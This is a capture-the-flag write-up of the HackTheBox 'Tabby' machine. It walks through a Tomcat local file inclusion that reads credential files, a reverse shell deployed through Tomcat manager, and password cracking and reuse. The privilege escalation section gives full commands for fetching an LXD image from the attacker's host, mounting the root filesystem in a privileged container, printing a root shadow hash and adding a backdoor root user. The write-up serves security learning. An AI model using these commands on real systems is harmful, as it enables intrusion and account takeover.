---
title: Write-up Tabby Machine
author: ScarNGone & pcw3r
date: 2020-11-07 17:00:00 +0100
categories: [HackTheBox, Boot2Root]
tags: [LINUX, EASY, FUZZING, LFI, PAYLOAD, ENUMERATION, CONTAINER, PASSWORD CRACKING]
---

**<center>Ref°: HTB-17-Boot2Root</center>**

![Desktop View]({{ "/assets/img/tabby/HTB-Badge-Tabby.png" | relative_url }})

— Tabby is a vulnerable machine through LFI in tomcat service and the reuse of a password to get into the target.

Privesc is possible from container LXD exploitation.

![Desktop View]({{ "/assets/img/tabby/HTB-Information-Tabby.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Network Service Scanning
***
We have the 4 following open ports : 22, 80, 8080 and 4446

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-nmap.png" | relative_url }})

### Website on port 80
***
We have website present on port 80.

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-website.png" | relative_url }})

THe main page reveal "We apologise to all our customers for the previous data breach. We have changed the site to remove this tool, and have invested heavily in more secure servers."

Interesting page : <http://megahosting.htb/news.php>


### Tomcat service on port 8080
***
Interesting paths who need authentication :
* <http://10.10.10.194:8080/host-manager/html>
* <http://10.10.10.194:8080/manager/html>

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-tomcat.png" | relative_url }})

## **<span style='color:#c0392b'>[2] Weaponization - Find exploit way</span>**
### Fuzzing and LFI in Tomcat service
***
Reference : <https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1>

Tomcat is vulnerable to LFI attack. We using this technique to recover sensitive information.

Grab passwd file for example :

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-LFI_passwd.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-information_users.png" | relative_url }})

We know that Tomcat service has interesting information in its file "tomcat-users.xml" and the location seem to be in $CATALINA_HOME : `/usr/share/tomcat9/conf/tomcat-users.xml`

Fuzzing method can help us to search the good location of this file.

Reference : <https://wfuzz.readthedocs.io/en/latest/user/advanced.html>

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-fuzzing.png" | relative_url }})

Result success on folder `etc` and get the file :

```terminal
wget http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml
```

Plaintext password and rolename!

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-rolename_tomcat.png" | relative_url }})

The role rolename="manager-script allows access to the text interface and the status pages only.

We have the possibility to connect now on host-manager but we can't exploit anything.

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-tomcat_host_manager.png" | relative_url }})
 
## **<span style='color:#c0392b'>[3] Foothold - Get into the target </span>**
### Deploy malicious remote script on tomcat manager
***
Reference : <https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script>

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-payload.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-deploy_remote_script_tomcat.png" | relative_url }})

We launch this new script from URL : http://10.10.10.194/privuser45

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-get_revshell.png" | relative_url }})

## **<span style='color:#c0392b'>[4] Lateral Movement - Move through environment</span>**
### Recover archive backup
***
Archive file backup present under website folders. We recover it to try finding anything inside.

```terminal
wget http://10.10.10.194/files/16162020_backup.zip
```

### Cracking archive password
***
![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-archive_password.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-crackzip.png" | relative_url }})


### Reusing password of ash user
***
ash user reuse this password and we can connect on from "su" command.

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-reuse_password.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-flag_user.png" | relative_url }})


## **<span style='color:#c0392b'>[5] Privilege Escalation - Gain higher-level permissions</span>**
### Enumeration
***
Many interesting information about lxd from linpeas enumeration.

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-linpeas.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-linpeas_1.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-linpeas_2.png" | relative_url }})


### Container LXD Exploitation
***
References : 
* <https://www.hackingarticles.in/lxd-privilege-escalation/>
* <https://www.exploit-db.com/exploits/46978>
* <https://github.com/saghul/lxd-alpine-builder>

The solution : mount root path in container with `lxd alpine builder`

From offensive machine :
```terminal
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

From victim machine :
```terminal
wget 10.10.14.67:1337/alpine-v3.12-x86_64-20200906_1836.tar.gz
lxc image import alpine-v3.12-x86_64-20200906_1836.tar.gz --alias privuser45 && lxd init --auto
lxc image list
lxc init privuser45 privesc -c security.privileged=true
lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc sh
```

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-malicious_container.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-create_container.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-conf_container.png" | relative_url }})

And we start our malicious container containing root path in `/mnt/root/root` .

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-privesc_container.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-flag_root.png" | relative_url }})

#### Bruteforce with johntheripper :

```terminal
root:$6$86Nxy4plrFeu0w4C$IfFB5j7BEbjBrUOtkmxyfUZ0lnNIxAcFn3meuvjGqFPSIogXynKx9FU1w3XJIC60rvwuKcg6feaeBqcNWMO0H/:18429:0:99999:7:::
root:x:0:0:root:/root:/bin/bash
```

#### Add malicious user with root privilege :
Reference : <https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/>

```terminal
perl -le 'print crypt("Password@973","addedsalt")'
echo "privuser45:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /mnt/root/etc/passwd

lxc delete privesc && lxc image delete privuser45
```

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-malicious_user.png" | relative_url }})

![Desktop View]({{ "/assets/img/tabby/HTB-Images-Tabby-malicious_user_1.png" | relative_url }})

***

# **<center>Trophy</center>**

> **If you can't give me poetry, can't you give me poetical science?**
>
> Ada Lovelace
